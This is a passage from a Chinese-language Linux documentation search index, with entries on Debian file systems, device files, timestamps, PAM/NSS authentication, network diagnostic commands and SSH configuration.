，它的性能将是非常好的。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-Set-Raid-10-or-1-+-0-(nested).html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-Set-Raid-10-or-1-+-0-(nested).html"},{"title":"类 Unix 文件系统","text":"在GNU/Linux和其他 类Unix 操作系统中， 文件 被组织到 目录 中。 所有的文件和目录排放在以 \" / \" 为根的巨大的树里。 叫它树是因为如果你画出文件系统，它看起来就像一棵树，但是它是颠倒过来的。 这些文件和目录可以分散在多个设备中。 /docs/操作系统/linux/linux指令/mount 用于把某个设备上找到的文件系统附着到巨大的文件树上。 相反的， umount 把它再次分离。 在最近的 Linux 内核里， mount 带某些参数时可以把文件树的一部分绑定到另外的地方， 或者可以把文件系统挂载为共享的、私有的、从设备、或不可绑定的。 对每个文件系统支持的挂载选项可以在 /usr/share/doc/linux-doc-*/Documentation/filesystems/ 找到。 Unix系统上叫做 目录 ， 某些其他系统上叫做 文件夹 。 请同样留意，在任何Unix系统上，没有的 驱动器 的概念， 例如 \" A: \" 。 这只有一个文件系统，并且所有东西都包含在内。 这相对于 Windows 来说是一个巨大的优点。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-Class-Unix-file-system.html","loc":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-Class-Unix-file-system.html"},{"title":"设备文件","text":"设备文件 包括系统的物理设备和虚拟设备，如硬盘、显卡、显示屏、键盘。 虚拟设备的一个例子是控制台，用\" /dev/console \"来描述。 设备文件有两种类型。 字符设备 每次访问一个字符 一个字符等于一个字节 如键盘、串口… 块设备 通过更大的单元–块，进行访问 一个块>一个字节 如硬盘等… 你可以读写块设备文件，尽管该文件可能包含二进制数据， 读取后显示出无法理解的乱码。 向文件写入数据，有时可以帮助定位硬件连接故障。 比如，你可以将文本文件导入打印机设备\" /dev/lp0 \"， 或者将调制解调命令发送到合适的串口\" /dev/ttyS0 \"。 但是，除非这些操作都小心完成，否则可能会导致一场大灾难。所以要特别小心。 注解 常规访问打印机，使用 lp 设备的节点数可以通过执行 ls 得到，如下所示: $ ls -l /dev/sda /dev/sr0 /dev/ttyS0 /dev/zero brw-rw---T 1 root disk 8, 0 Oct 16 20:57 /dev/sda brw-rw---T+ 1 root cdrom 11, 0 Oct 16 21:53 /dev/sr0 crw-rw---T 1 root dialout 4, 64 Oct 16 20:57 /dev/ttyS0 crw-rw-rw- 1 root root 1, 5 Oct 16 20:57 /dev/zero /dev/sda 的主设备号是8，次设备号是0。它可以被 disk 群组的用户读写。 /dev/sr0 的主设备号是11，次设备号是0。它可以被 cdrom 群组的用户读写。 /dev/ttyS0 的主设备号是4，次设备号是64。它可以被 dailout 群组的用户读写。 /dev/zero 的主设备号是1，次设备号是5。它可以被任意用户读写。 在现代Linux系统中，处在 /dev 之下的文件系统会自动被 udev 机制填充。 特殊设备文件 还有一些特殊的设备文件。 特殊设备文件列表 设备文件 操作 响应描述 /dev/null 读取 返回 文件结尾字符（EOF） /dev/null 写入 无返回（一个无底的数据转存深渊） /dev/zero 读取 返回 0 空符（与ASCII中的数字0不同） /dev/random 读取 从真随机数产生器返回一个随机字符，供应真熵（缓慢） /dev/urandom 读取 从能够安全加密的伪随机数产生器返回一个随机字符 /dev/full 写入 返回磁盘已满（ENOSPC）错误 这些特别设备文件经常和 shell 数据重定向联合使用","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-Device-file.html","loc":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-Device-file.html"},{"title":"procfs 和 sysfs","text":"procfs 和 sysfs 两个伪文件系统， 分别加载于 /proc 和 /sys 之上， 将内核中的数据结构暴露给用户空间。 或者说，这些条目是虚拟的，他们打开了深入了解操作系统运行的方便之门。 目录 /proc 为每个正在运行的进程提供了一个子目录， 目录的名字就是进程标识符（PID）。 需要读取进程信息的系统工具，如 ps ，可以从这个目录结构获得信息。 /proc/sys 之下的目录， 包含了可以更改某些内核运行参数的接口。 （你也可以使用专门的 sysctl () 命令修改，或者使用其预加载/配置文件 /etc/sysctl.conf ） 当人们看到这个特别大的文件 /proc/kcore 时，常常会惊慌失措。 这个文件于你的的电脑内存大小相差不多。 它被用来调试内核。它是一个虚拟文件，指向系统内存，所以不必担心它的大小。 /sys 以下的目录包含了内核输出的数据结构，它们的属性，以及它们之间的链接。 它同时也包含了改变某些内核运行时参数的接口。 参考: proc.txt(.gz) sysfs.txt(.gz) 以及其他相关的Linux内核文档 /usr/share/doc/linux-doc-*/Documentation/filesystems/* 这些文件由 `linux-doc-*` 软件包提供。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-ProCFS-and-Sysfs.html","loc":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-ProCFS-and-Sysfs.html"},{"title":"特殊按键","text":"在 类Unix 环境， 有一些具有特殊含义的按键。 请注意，普通的Linux字符控制台，只有左手边的 Ctrl 和 Alt 键可以正常工作。其中有几个值得记住的按键。 bash 的按键绑定列表 快捷键 快捷键描述 Ctrl-U 删除光标前到行首的字符 Ctrl-H 删除光标前的一个字符 Ctrl-D 终止输入（如果你在使用 shell，则退出 shell） Ctrl-C 终止一个正在运行的程序 Ctrl-Z 通过将程序移动到后台来暂停程序 Ctrl-S 停止屏幕输出 Ctrl-Q 激活屏幕输出 Ctrl-Alt-Del 重启/关闭系统，参见 inittab 左 Alt 键 (可选择同时按下 Windows-key ) Emacs 和相似 UI 的元键（meta-key） Up-arrow 向上方向键 开始在 bash 中查看命令历史 Ctrl-R 开始在 bash 的增量命令历史中搜索 Tab 在 bash 命令行中补全文件名 跟 /docs/操作系统/linux/教程/快捷键 基本一致","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-Special-buttons.html","loc":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-Special-buttons.html"},{"title":"GNU/Linux 文件有三种类型的时间戳","text":"时间戳类型列表 类型 含义（历史上 Unix 的定义） mtime 文件修改时间( ls -1 ) ctime 文件状态修改时间 ( ls -lc ) atime 文件最后被访问的时间 ( ls -lu ) 注意 ctime 不是文件创建时间。 注意 atime 在 GNU/Linux 系统上的真实值可能和历史上 Unix 的定义有所不同。 覆盖 一个文件，将会改变该文件所有的 mtime , ctime , 和 atime 属性。 改变文件的 所有者或者权限 ，将改变文件的 ctime 和 atime 属性。 在历史上的 Unix 系统中，读取一个文件将改变文件的 atime 属性。 读一个文件，将改变文件的 atime 属性； 在 GNU/Linux 系统上，这仅发生在其文件系统使用\" strictatime \"参数挂载的情况下。 如果 GNU/Linux 系统的文件系统使用 \" relatime \" 选项挂载， 第一次读文件，或者随后读文件，将改变该文件的 atime 属性. (从 Linux 2.6.30 开始的默认行为) 如果 GNU/Linux 系统的文件系统使用 \" noatime \" 挂载，则读一个文件，不会改变这个文件的 atime 属性。 注解 为了在正常的使用场景中能够提升文件系统的读取效率， 新增了 \" noatime \" 和 \" relatime \" 这两个加载选项。 如使用了 \" strictatime \" 选项， 即使简单的文件读操作都伴随着更新 atime 属性这个耗时的写操作。 但是 atime 属性除了 mbox 文件以外却很少用到。 详情请看 /docs/操作系统/linux/linux指令/mount 。 使用 /docs/操作系统/linux/linux指令/touch 命令修改已存在文件的时间戳。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-Three-types-of-time-stamps.html","loc":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-Three-types-of-time-stamps.html"},{"title":"debian10 iptables-restore 的 bug","text":"系统是在官网下载的包安装的虚拟机 再一次业务对接过程中意外发现业务连不上这台机器， 经过排除大法， 终于发现此 debian10 机器的 iptables-restore 模块存在问题 在 debian9 的系统上测试无此问题。 在网上也没有找到相关的记录 本来想提交给 debian 官网，奈何没有找到入口，遂在此记录。 当使用 iptables-restore 恢复防火墙时，会清除 -D 规则之前的所有防火墙条目 问题图，-D前的规则被删除 系统配置图 在社区以及官网找了很久都没有找到相关说明 先记录一下","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-question-Debian10-iptables-restore-bug.html","loc":"/yq-doc-source-docs-operating-system-linux-question-Debian10-iptables-restore-bug.html"},{"title":"定时任务","text":"使用 /docs/操作系统/linux/linux指令/crond 来进行定时任务安排。参见 crontab 和 crontab 你能够作为一个普通用户定时运行一个进程，比如， foo 使用 crontab -e 命令创建一个 crontab 文件 /var/spool/cron/crontabs/foo","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-question-Timing-task.html","loc":"/yq-doc-source-docs-operating-system-linux-question-Timing-task.html"},{"title":"警告所有人","text":"你可以通过下面的方式使用 /docs/操作系统/linux/linux指令/wall 给登录系统的每一个人发送信息: $ echo \"We are shutting down in 1 hour\" | wall","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-question-Warning-everyone.html","loc":"/yq-doc-source-docs-operating-system-linux-question-Warning-everyone.html"},{"title":"认证和访问控制","text":"一般的 Unix 认证 一般的 Unix 认证由 PAM(Pluggable Authentication Modules,即可插入的验证模块) 下的 pam_unix 模块提供。 它的 3 个重要文件如下，其内的条目使用 \" : \" 分隔: 文件 权限 用户 组 说明 /etc/passwd -rw-r--r-- root root （明文的）用户账号信息 /etc/shadow -rw-r----- root shadow 安全加密的用户账号信息 /etc/group -rw-r--r-- root root 组信息 /etc/passwd` /etc/passwd 包含下列内容: user1:x:1000:1000:User1 Name,,,:/home/user1:/bin/bash user2:x:1001:1001:User2 Name,,,:/home/user2:/bin/bash 如 passwd 中所述，这个文件中被 \" : \" 分隔的每项含义如下。 登录名 密码形式说明 数字形式的用户 ID 数字形式的组 ID 用户名或注释字段 用户家目录 可选的用户命令解释器 /etc/passwd 的第二项曾经被用来保存加密后的密码。在引入了 \" /etc/shadow \" 后，该项被用来说明密码形式。 /etc/shadow /etc/shadow 包含下列内容: user1:$1$Xop0FYH9$IfxyQwBe9b8tiyIkt2P4F/:13262:0:99999:7::: user2:$1$vXGZLVbS$ElyErNf/agUDsm1DehJMS/:13261:0:99999:7::: 如 shadow (5) 中所述，这个文件中被 \" : \" 分隔的每项含义如下。 登录名 加密后的密码（开头的 \" $1$ \" 表示使用 MD5 加密。\"*\" 表示无法登陆。） 最后一次修改密码的时间，其表示从 1970 年 1 月 1 日起的天数 允许用户再次修改密码的天数间隔 用户必须修改密码的天数间隔密码失效前的天数，在此期间用户会被警告 密码失效后的天数，在次期间密码依旧会被接受账号失效的时间，其表示从 1970 年 1 月 1 日起的天数 … /etc/group /etc/group 包含下列内容: group1:x:20:user1,user2 如 group (5) 中所述，这个文件中被 \" : \" 分隔的每项含义如下。 组名称 加密后的密码（不会被真正使用） 数字形式的组 ID 使用 \",\" 分隔的用户名列表 注解 \" /etc/gshadow \" 为 \" /etc/group \" 提供了与 \" /etc/shadow \" 相似的功能，但没有被真正地使用。 如果\" auth optional pam_group.so \" 这行添加到了\" /etc/pam.d/common-auth \"， 并且在\" /etc/security/group.conf \" 里进行了设置，一个用户的实际组就可以被动态添加。参见 pam_group (8). base-passwd 软件包包含了一份用户和组的官方文档：\" /usr/share/doc/base-passwd/users-and-groups.html \"。 设立加密的密码 下面是一些用于 生成加盐的加密密码 的独立工具 生成密码的工具: 软件包 流行度 大小 命令 功能 whois V:32, I:371 364 mkpasswd 具备 crypt(3) 库所有特性的前端 openssl V:814, I:994 1465 openssl passwd 计算密码哈希 (OpenSSL). passwd(1ssl) PAM 和 NSS 可参考: PAM模块 现代的 类 Unix 系统（例如 Debian 系统）提供 PAM(Pluggable Authentication Modules,即可插入的验证模块) 和 NSS（Name Service Switch，名称服务切换） 机制给本地系统管理员，使他们能够配置自己的系统。它们的功能可以概括为以下几点。 PAM 给应用软件提供了一个灵活的认证机制，因此涉及到了密码数据的交换。 NSS 提供了一个灵活的名称服务机制， 它经常被 C 标准库 使用， 使例如 ls (1) 和 id (1) 这样的程序获得用户和组名称。 PAM 和 NSS 系统必须保持配置一致。 PAM 和 NSS 系统中重要的软件包如下: 软件包 流行度 大小 说明 libpam-modules V:813, I:999 1048 插入式验证模块（基础服务） libpam-ldap I:12 249 允许 LDAP 接口的插入式验证模块 libpam-cracklib I:15 117 启用 cracklib 支持的插入式验证模块 libpam-systemd V:484, I:869 574 用于 logind 注册用户会话的插入式验证模块（PAM） libpam-doc I:1 1046 插入式验证模块（html 和 文本文档） libc6 V:946, I:999 12772 GNU C 库：同样提供\"名称服务切换\"服务的共享库 glibc-doc I:11 3161 GNU C 库：帮助页面 glibc-doc-reference I:4 12740 GNU C 库：参考手册，有 info、pdf 和 html 格式（non-free） libnss-mdns I:508 150 用于解析组播 DNS 名称的 NSS 模块 libnss-ldap I:11 265 NSS 模块，用于使用 LDAP 作为一个名称服务的 libnss-ldapd I:14 153 NSS 模块，用于使用 LDAP 作为一个名称服务的（libnss-ldap 的新 fork） libpam-doc 中 \"The Linux-PAM System Administrators' Guide\" 是了解 PAM 配置的必要文档。 glibc-doc-reference 中的 \"System Databases and Name Service Switch\" 是了解 NSS 配置的重要文档。 注意 你可以使用 \" aptitude search 'libpam-|libnss-' \" 命令查看更多的相关软件包。 NSS 缩写也可能意味着 \"Network Security Service，网络安全服务\"，它不同于 \"Name Service Switch，名称服务切换\"。 PAM 是用来为每个程序使用系统范围的默认值来初始化环境变量的最基础方法。 在 systemd 下, libpam-systemd 软件包被安装用来管理用户登录， 通过为 logind 在 systemd 控制组层级中注册用户会话来实现。 PAM 和 NSS 访问的配置文件 下面是一些 PAM 和 NSS 访问的重要配置文件: 配置文件 功能 /etc/pam.d/program_name 为 \"program_name\" 程序设置 PAM 配置；参加 pam(7) 和 pam.d(5) /etc/nsswitch.conf 为每个服务条目设置 NSS 配置。参见 nsswitch.conf(5) /etc/nologin 通过 pam_nologin(8) 模块限制用户登陆 /etc/securetty 通过 pam_securetty(8) 模块限制 root 访问 tty /etc/security/access.conf 通过 pam_access(8) 模块设置访问限制 /etc/security/group.conf 通过 pam_group(8) 模块设置基于组的限制 /etc/security/pam_env.conf 通过 pam_env(8) 模块设置环境变量 /etc/environment 通过带有 \"readenv=1\" 参数的 pam_env(8) 模块设置额外的环境变量 /etc/default/locale 通过带有 \"readenv=1 envfile=/etc/default/locale\" 参数的 pam_env(8) 模块设置语言环境值（在 Debian 系统中） /etc/security/limits.conf 通过 pam_linits(8) 模块设置资源限制（ulimit、core 等等） /etc/security/time.conf 通过 pam_time(8) 模块设置时间限制 /etc/systemd/logind.conf 设置systemd 的登录管理器配置 (参见 logind.conf(5) 和 systemd-logind.service(8)) 密码选择的限制是通过 PAM 模块 pam_unix (8) 和 pam_cracklib (8) 来实现的。它们可以通过各自的参数进行配置。 注解 PAM 模块在文件名中使用后缀 \" .so \"。 现代的集中式系统管理 现代的集中式系统管理可以使用集中式的 轻量目录访问协议（LDAP） 服务器进行部署，从而通过网络管理许多类 Unix 和 非类 Unix 系统。 轻量目录访问协议的开源实现是 OpenLDAP 软件 LDAP 服务器使用带有 PAM 和 NSS 的 libpam-ldap 和 libnss-ldap 软件包为 Debian 系统提供账号信息。 需要一些动作来启用 LDAP（我没有使用过这个设置，并且下面的信息纯粹是第二手的信息。请在这种前提下阅读下列内容。 通过运行一个程序，例如独立的 LDAP 守护进程 slapd (8)，来建立集中式的 LDAP 服务器。 你在 \" /etc/pam.d/ \" 目录中的 PAM 配置文件里，使用 \" pam_ldap.so \" 替代默认值 \" pam_unix.so \"。 - Debian 使用 \" /etc/pam_ldap.conf \" 作为 libpam-ldap 的配置文件，\" /etc/pam_ldap.secret \" 作为保存 root 密码的文件。 你在 \" /etc/nsswitch.conf \" 文件中改变 NSS 配置，使用 \" ldap \" 替代默认值（\" compat \" 或 \" file \"）。 - Debian 使用 \" /etc/libnss-ldap.conf \" 作为 libnss-ldap 的配置文件。 为了密码的安全，你必须让 libpam-ldap 使用 SLL（或 TLS） 连接。 为了确保 LDAP 网络开销数据的完整性，你必须让 libpam-ldap 使用 SLL（或 TLS） 连接。 为了减少 LDAP 网络流量，你应该在本地运行 nscd (8) 来缓存任何 LDAP 搜索结果。 为什么 GNU su 不支持 wheel 组 这是在旧的 \" info su \" 底部 Richard M. Stallman 所说的一句名言。 别担心：Debian 系统中当前的 su 命令使用了 PAM， 这样当在 \" /etc/pam.d/su \" 中启用了带有 \" pam_wheel.so \" 的行后， 就能够限制非 wheel 组的用户 su 到 root 组的能力。 确保互联网上的的密码安全 许多流行的传输层服务都使用纯文本来传输包括密码验证信息在内的各类消息。 使用纯文本在公网上传输密码是很糟糕的做法，因为这样传输的密码很容易在网上被他人截获。 为了确保整个沟通过程，包括密码信息在内都使用加密传输来确保安全， 您可以在 传输层安全（Transport Layer Security，TLS） 协议或者其前身，\"安全套接字层（Secure Sockets Layer，SSL）\"协议之上运行这些服务: 不安全的服务名 端口 安全的服务名 端口 www (http) 80 https 443 smtp (邮件) 25 ssmtp (smtps) 465 ftp-data 20 ftps-data 989 ftp 21 ftps 990 telnet 23 telnets 992 imap2 143 imaps 993 pop3 110 pop3s 995 ldap 389 ldaps 636 加密消耗 CPU 时间。 作为对 CPU 有益的替代方案，你可以保持使用纯文本通讯， 仅仅使用安全认证协议加密密码， 比如说：POP 使用\"Authenticated Post Office Protocol\" (APOP)， SMTP 和 IMAP 使用 \"Challenge-Response Authentication Mechanism MD5\" (CRAM-MD5)。 （你的邮件客户端通过互联网上你的邮件服务器发送邮件时， 最近流行使用新的递交端口 587 来代替传统的 SMTP 端口 25， 这样可以避免在使用 CRAM-MD5 认证自己时，网络提供商阻塞 25 端口。） 安全 Shell 安全 Shell (SSH) 程序使用安全认证来提供不安全网络上两个不可信任主机之间的安全加密通讯。 它由 OpenSSH 客户端, ssh (1), 和 OpenSSH 后台守护进程（daemon）, sshd (8)组成.SSH 使用端口转发特性， 可以给 POP 和 X 之类的不安全的协议通讯建立隧道，使其可以在互联网上安全传输。 客户端可以使用如下方式来认证自己： 基于主机的认证 公钥认证 质疑应答认证 密码认证 使用公钥认证，可以实现远程免密码登录。 参见 第 6.3 节 \"服务器远程访问和工具 (SSH)\" root 密码安全 为阻止人们使用 root 权限访问你的机器，你需要做下面的操作。 阻止对硬盘的物理访问 锁住 UEFI/ BIOS 来阻止从可移动介质启动 为 GRUB 交互式会话设置密码 锁住 GRUB 菜单，禁止编辑 sudo 参考: /docs/操作系统/linux/linux指令/sudo PolicyKit PolicyKit 是在类 Unix 操作系统中控制整个系统权限的一个操作系统组件。 较新的 GUI 图形界面程序设计时便考虑到了不作为特权进程来运行。 它们通过 PolicyKit 来和特权进程通信，从而执行管理操作。 在 Debian 系统中，PolicyKit 限制了属于 sudo 组的用户账号的这种操作。 网络设置 主机名解析 主机名解析，目前也是由 NSS (名字服务转换 Name Service Switch) 机制来支持。这个解析的流程如下 /etc/nsswitch.conf 文件里的 hosts: files dns 这段规定主机名解析顺序。 (代替 /etc/host.conf 文件里的\" order 这段原有的功能。) files 方式首先被调用。如果主机名在 /etc/hosts 文件里面发现， 则返回所有有效地址并退出。 ( /etc/host.conf 文件包含 multi on .) dns 方式被调用。如果主机名通过查询 /etc/resolv.conf 文件里面写的 互联网域名系统 Domain Name System (DNS) 来找到，则返回所有有效地址并退出 /etc/hosts 参考 /docs/操作系统/linux/配置文件/etc-hosts /etc/resolv.conf 参考 /docs/操作系统/linux/配置文件/etc-resolv-conf 对于典型 adhoc 局域网环境下的 PC 工作站，除了基本的 files 和 dns 方式之外， 主机名还能够通过组播 DNS mDNS, [零配置网络 Zeroconf 进行解析 Avahi <https://zh.wikipedia.org/wiki/Avahi_(software)>_ 提供 Debian 下的组播 DNS 发现框架。 它和 Apple Bonjour / Apple Rendezvous 相当. libnss-mdns 插件包提供 mDNS 的主机名解析，GNU C 库 (glibc)的 GNU 名字服务转换 Name Service Switch (NSS) 功能支持 mDNS。 \" /etc/nsswitch.conf \" 文件应当有像 \" hosts: files mdns4_minimal [NOTFOUND=return] dns mdns4 \" 这样的一段. \".local\" 结尾的主机名， 使用 pseudo-top-level domain (TLD) 来解析. mDNS IPv4 本地连接组播地址 \" 224.0.0.251 \" 或它相应的 IPv6 地址 \" FF02::FB \" 被用来作为 \" .local \" 结尾名字的 DNS 查询。 较老的 Windows 系统安装 winbind 软件包来提供旧的 NETBios over TCP/IP 主机名解析。 为启用这个功能，\" /etc/nsswitch.conf \" 文件应当有这样的一段： \" hosts: files mdns4_minimal [NOTFOUND=return] dns mdns4 wins \"。 (现代 Windows 系统通常使用 dns 方式来进行主机名解析。) 局域网网络地址范围 让我们重新提醒下在 rfc1918 里规定的 局域网 local area networks (LANs) IPv4 32 位地址在各类地址的保留范围. 这些地址保证不会与因特网上专有的地址冲突。 注解 IP 地址书写中有冒号的是 IPv6 地址 ， 例如，\" ::1 \" 是 localhost 本地主机 网络地址范围列表: 类别 网络地址 子网掩码 子网掩码/位数 子网数 A 10.x.x.x 255.0.0.0 /8 1 B 172.16.x.x — 172.31.x.x 255.255.0.0 /16 16 C 192.168.0.x — 192.168.255.x 255.255.255.0 /24 256 注解 如果这些地址分配到一个主机，那么这个主机一定不能够直接访问互联网， 必须通过一个作为网关的代理服务或通过 网络地址转换 Network Address Translation (NAT) . 消费局域网环境，宽带路由器通常使用 NAT。 图形界面的网络配置工具 Debian 系统 NM 的官方文档位于 \" /usr/share/doc/network-manager/README.Debian \" 。 本质上，如下操作即可完成桌面的网络配置。 通过下列命令使桌面用户 foo 归属 \" netdev \" 组 （另外，例如 GNOME 和 KDE 这样的现代桌面环境会通过 [D-bus < https://zh.wikipedia.org/wiki/D-Bus ) 自动完成该操作）: $ sudo adduser foo netdev 使 \" /etc/network/interfaces \" 的 配置保持下面那样简洁: auto lo iface lo inet loopback 通过下列 命令重新启动 NM: $ sudo systemctl restart network-manager 通过图形界面配置网络 注意, 只有 不 列在 \" /etc/network/interfaces \" 中的接口会被 NM 管理，以避免与 ifupdown 的冲突。 提示 如果你想扩展 NM 的网络配置功能，请寻找适当的插件模块和补充软件包， 例如 network-manager-openconnect 、 network-manager-openvpn-gnome 、 network-manager-pptp-gnome 、 mobile-broadband-provider-info 、 gnome-bluetooth 等等。 底层网络配置 在 Linux 上的底层网络配置，使用 iproute2 程序 ( ip (8), …) . Iproute2 命令 Iproute2 命令集提供完整的底层网络配置能力。 有个从旧的 net-tools 命令集到新的 iproute2 命令集的转换表 从旧的 net-tools 命令集到新的 iproute2 命令集转换表: 旧的 net-tools 新的 iproute2 操作 ifconfig(8) ip addr 一个设备上的协议（IP 或 IPv6）地址 route(8) ip route 路由表条目 arp(8) ip neigh ARP 或 NDISC 缓存条目 ipmaddr ip maddr 多播地址 iptunnel ip tunnel IP 隧道 nameif(8) ifrename(8) 基于 MAC 地址的网络接口名 mii-tool(8) ethtool(8) 以太网设备设置 安全的底层网络操作 你可以按下面的方式安全的使用底层网络命令，这些命令不会改变网络配置: 命令 说明 ip addr show 显示活动的网络接口连接和地址状态 route -n 用数字地址显示全部路由表 ip route show 用数字地址显示全部路由表 arp 显示当前 ARP 缓存表的内容 ip neigh 显示当前 ARP 缓存表的内容 plog 显示 ppp 后台守护进程（daemon）日志 ping yahoo.com 检查到 \"yahoo.com\" 的因特网连接 whois yahoo.com 在域名数据库里面检查谁注册了 \"yahoo.com\" traceroute yahoo.com 跟踪到 \"yahoo.com\" 的因特网连接 tracepath yahoo.com 跟踪到 \"yahoo.com\" 的因特网连接 mtr yahoo.com 跟踪到 \"yahoo.com\" 的因特网连接（重复的） dig 查询由 \"dns-server.com\" 提供服务的 \"example.com\" 域名的 DNS 记录： \"a\", \"mx\" 或 \"any\" 记录 dig[@dns-server.com] example.com [{a|mx|any}] iptables -L -n 查看包过滤 netstat -a 找出所有打开的端口 netstat -l --inet 找出监听端口 netstat -ln --tcp 找出 TCP 监听端口（数字的） dlint example.com 查询 \"example.com\" 的 DNS zone 信息 找出最佳 MTU 最大传输单元 Maximum Transmission Unit (MTU) 的值能够通过加 \" -M do \" 选项的 ping (8) 实验来确定， 它发送从 1500 字节（对于IP+ICMP 包头，有 28 字节的偏移）大小开始的 ICMP 包，来找出 IP 不分片的最大包大小。 尝试下列例子: $ ping -c 1 -s $((1500-28)) -M do www.debian.org PING www.debian.org (194.109.137.218) 1472(1500) bytes of data. From 192.168.11.2 icmp_seq=1 Frag needed and DF set (mtu = 1454) --- www.debian.org ping statistics --- 0 packets transmitted, 0 received, +1 errors 尝试 MTU=1454 代替 MTU=1500 你看到用 MTU=1454 ping (8) 成功了。 如果 MTU 不是 1500，你可能想在 NM 里面配置 MTU 设置。 这个过程是 路径 MTU (PMTU) 发现 , [RFC1191 , tracepath (8) 命令能够自动完成这个。 注解 上面的列子，PMTU 的值是 1454，这是我先前的光纤到户提供商， 使用了 异步传输模式 Asynchronous Transfer Mode (ATM) 作为他们的骨干网络，并使用 PPPoE 作为客户端。实际 PMTU 值依赖于你的环境，比如说，我新的光纤到户提供商是 1500。 网络应用 浏览器配置 在某些浏览器中，你可以使用下列特殊的 URL 来确认它们的设置。 \" about: \" \" about:config \" \" about:plugins \" SSH 国际化和本地化 系统技巧-任务安排 ../问题/单次任务 ../问题/定时任务 ../问题/谁在系统 ../问题/警告所有人 ../教程/硬盘分区配置 ../问题/二进制数据访问","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-system-service-Certification-and-access-control.html","loc":"/yq-doc-source-docs-operating-system-linux-system-service-Certification-and-access-control.html"},{"title":"crontab服务","text":"见 /docs/操作系统/linux/linux指令/crond","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-system-service-Crontab-service.html","loc":"/yq-doc-source-docs-operating-system-linux-system-service-Crontab-service.html"},{"title":"SSH配置","text":"服务器远程访问和工具 (SSH, Secure Shell) Secure SHell (SSH) 是因特网上的 安全 连接方式。 在 Debian 里面，有一个叫 OpenSSH 的免费 SSH 版本，在 openssh-client 和 openssh-server 包里。 对于用户来讲, ssh 功能比 telnet 更加智能和安全. 不像 telnet 命令, ssh 命令不会在遇到 telnet 的退出字符(初始默认是 CTRL-])时停止. SSH 基础 OpenSSH SSH 后台守护进程（daemon）只支持 SSH 2协议。 警告 如果想要运行 OpenSSH 服务， /etc/ssh/sshd_not_to_be_run 必须不存在。 不要打开基于 rhost 的认证( /etc/ssh/sshd_config 中的 HostbasedAuthentication )。 处理其它 SSH 客户端 其它平台上有一些免费的 SSH 客户端。 其它平台上免费 SSH 客户端列表: 环境 免费 SSH 程序 Windows puTTY (http://www.chiark.greenend.org.uk/~sgtatham/putty/) (GPL) Windows (cygwin) cygwin 里的 SSH (http://www.cygwin.com/) (GPL) Macintosh 类 macSSH (http://www.macssh.com/) (GPL) Mac OS X OpenSSH;在终端应用中使用 ssh (GPL) 建立 ssh 代理 用密码来保护你的 SSH 认证私钥是安全的。 如果密码没有设置，使用 ssh-keygen -p 来设置。 把你的公钥 (比如： ~/.ssh/id_rsa.pub ) 放到远程主机的 ~/.ssh/authorized_keys ，这个远程主机使用上面描述的基于密码的连接方式: $ ssh-agent bash $ ssh-add ~/.ssh/id_rsa Enter passphrase for /home/*username*/.ssh/id_rsa: Identity added: /home/*username*/.ssh/id_rsa (/home/*username*/.ssh/id_rsa) 从这里执行接下来的命令，就不再需要密码: $ scp foo username@remote.host:foo 按 &#94;D 来终结 ssh 代理会话。 对于 X 服务端， 通常的 Debian 启动脚本会作为父进程执行 ssh-agent 。 所以你只需要执行一次 ssh-add 。进一步的信息，请阅读 ssh-agent 和 ssh-add . 怎样通过 SSH 关闭远程系统 你可以使用 at 命令 (参见 第 9.4.13 节 \"单次任务时间安排\" ) 来从 SSH 终端里保护 shutdown -h now (参见 第 1.1.8 节 \"怎样关闭系统\" 操作过程: ### echo \"shutdown -h now\" | at now SSH 故障排查 如果你遇到问题，检查配置文件的权限并用 -v 选项运行 ssh 如果你是 root 账户，并有使用防火墙，使用 -p 选项; 这可以避免使用1 — 1023 之间的服务端口. 如果 ssh 连接到远程站点突然停止工作，这也许是系统管理员胡乱操作的结果， 可能是在系统维护时改变了 host_key . 在确认这个情况后，并且没有人试图用聪明的黑客技术来篡改远程主机， 你可以在本机 ~/.ssh/known_hosts 里删除 host_key 条目来重新获得连接 设置会话过期 设置会话过期: # /etc/ssh/sshd_config ServerAliveInterval 60 # 单次发送包检查链接时间，单位是秒，为0表示不发 ServerAliveCountMax 30 # 最大检查次数，超过后断开链接 ClientAliveInterval 这个其实就是SSH Server与Client的心跳超时时间， 也就是说，当客户端没有指令过来， Server间隔`ClientAliveInterval`的时间（单位秒）会发一个空包到Client来维持心跳， 60表示每分钟发送一次，然后客户端响应，这样就保持长连接了保证Session有效, 默认是0, 不发送; ClientAliveCountMax 当心跳包发送失败时重试的次数，比如现在我们设置成了30， 如果Server向Client连续发30次心跳包都失败了，就会断开这个session连接。 另一个地方: # /etc/profile TMOUT=60 # 空闲等待时间，默认值0，表示不超时 ssh的时候定义别名 方法 1 – 使用 SSH 配置文件 这是我创建别名的首选方法。 我们可以使用 SSH 默认配置文件来创建 SSH 别名。为此， 编辑 ~/.ssh/config 文件（如果此文件不存在，只需创建一个）: $ vi ~/.ssh/config 添加所有远程主机的详细信息，如下所示: Host webserver HostName 192.168.225.22 User sk Host dns HostName server.example.com User root Host dhcp HostName 192.168.225.25 User ostechnix Port 2233 方法 2 – 使用 Bash 别名 这是创建 SSH 别名的一种应急变通的方法，可以加快通信的速度。 你可以使用 /docs/操作系统/linux/linux指令/alias 使这项任务更容易。 打开 ~/.bashrc 或者 ~/.bash_profile 文件: alias webserver='ssh sk@server.example.com' alias dns='ssh sk@server.example.com' alias dhcp='ssh sk@server.example.com -p 2233' alias ubuntu='ssh sk@server.example.com -i 